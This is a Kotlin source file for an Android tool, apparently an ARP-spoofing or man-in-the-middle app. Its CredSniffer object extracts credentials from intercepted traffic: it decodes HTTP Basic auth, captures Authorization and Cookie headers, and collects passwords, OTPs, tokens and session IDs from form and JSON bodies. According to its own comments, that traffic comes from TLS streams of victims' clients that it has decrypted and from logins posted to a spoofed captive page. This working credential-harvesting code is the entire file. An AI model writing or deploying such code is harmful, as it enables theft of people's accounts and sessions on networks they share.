package com.winarp.mobile.net

import android.util.Base64
import java.net.URLDecoder

/**
 * Extracts credentials from cleartext HTTP that we can already see: the decrypted TLS stream
 * (non-validating / CA-trusted clients) and POSTs that land on our spoof/captive page server.
 *
 * It reports what is genuinely recoverable and NOTHING it can't reach — banking/pinned apps never
 * hit this path (their TLS never terminates on us), so a [CREDS] line always means real cleartext,
 * not a guess. Pure and side-effect free; callers decide where the strings go (log/UI).
 */
object CredSniffer {

    // Form/JSON/query keys worth surfacing. Lowercased compare.
    private val sensitiveKeys = setOf(
        "password", "passwd", "pass", "pwd", "pin", "otp", "mfa", "code",
        "token", "access_token", "id_token", "refresh_token", "auth", "authorization",
        "secret", "api_key", "apikey", "api-key", "session", "sessionid", "sid",
        "user", "username", "usuario", "login", "email", "correo", "account",
        "j_username", "j_password"
    )

    /** Full decrypted/plaintext HTTP request text (head + optional body). */
    fun scanText(host: String, text: String): List<String> {
        val split = text.indexOf("\r\n\r\n").let { if (it >= 0) it else text.indexOf("\n\n") }
        val head = if (split >= 0) text.substring(0, split) else text
        val body = if (split >= 0) text.substring(split).trim() else ""
        val headerLines = head.split("\r\n", "\n")
        val contentType = headerLines.firstOrNull { it.startsWith("content-type:", true) }
            ?.substringAfter(':')?.trim() ?: ""
        val out = ArrayList<String>()
        out += scanHeaders(host, headerLines)
        out += scanBody(host, contentType, body)
        return out
    }

    /** Authorization / Cookie headers. [headerLines] are raw header lines (no CRLF). */
    fun scanHeaders(host: String, headerLines: List<String>): List<String> {
        val out = ArrayList<String>()
        for (h in headerLines) {
            val lower = h.lowercase()
            when {
                lower.startsWith("authorization:") -> {
                    val v = h.substringAfter(':').trim()
                    if (v.startsWith("Basic ", true)) {
                        val dec = decodeBasic(v.substringAfter(' ').trim())
                        if (dec != null) out += "[CREDS] $host — HTTP Basic  $dec"
                    } else {
                        val scheme = v.substringBefore(' ').ifBlank { "token" }
                        out += "[CREDS] $host — $scheme ${trunc(v.substringAfter(' ', v), 48)}"
                    }
                }
                lower.startsWith("cookie:") -> {
                    val v = h.substringAfter(':').trim()
                    if (v.isNotBlank()) out += "[CREDS] $host — Cookie ${trunc(v, 80)}"
                }
                lower.startsWith("proxy-authorization:") -> {
                    val dec = decodeBasic(h.substringAfter(':').trim().substringAfter(' ').trim())
                    if (dec != null) out += "[CREDS] $host — Proxy-Auth  $dec"
                }
            }
        }
        return out
    }

    /** Form-urlencoded, JSON, or query-string bodies. */
    fun scanBody(host: String, contentType: String, body: String): List<String> {
        if (body.isBlank()) return emptyList()
        val out = ArrayList<String>()
        val ct = contentType.lowercase()
        when {
            ct.contains("application/json") || (body.startsWith("{") && body.contains(':')) -> {
                // loose JSON: "key":"value"
                val re = Regex("\"([A-Za-z0-9_\\-]+)\"\\s*:\\s*\"([^\"]*)\"")
                for (m in re.findAll(body)) {
                    if (m.groupValues[1].lowercase() in sensitiveKeys) {
                        out += "[CREDS] $host — ${m.groupValues[1]}=${trunc(m.groupValues[2], 48)}"
                    }
                }
            }
            else -> {
                // form-urlencoded key=value&key=value
                for (pair in body.split('&')) {
                    val k = pair.substringBefore('=').trim()
                    if (k.isEmpty()) continue
                    if (k.lowercase() in sensitiveKeys) {
                        val v = urlDecode(pair.substringAfter('=', ""))
                        out += "[CREDS] $host — $k=${trunc(v, 48)}"
                    }
                }
            }
        }
        return out
    }

    private fun decodeBasic(b64: String): String? = try {
        val s = String(Base64.decode(b64, Base64.DEFAULT), Charsets.UTF_8)
        if (s.contains(':')) s else null
    } catch (_: Throwable) {
        null
    }

    private fun urlDecode(s: String): String = try {
        URLDecoder.decode(s, "UTF-8")
    } catch (_: Throwable) {
        s
    }

    private fun trunc(s: String, n: Int): String = if (s.length <= n) s else s.take(n) + "…"
}
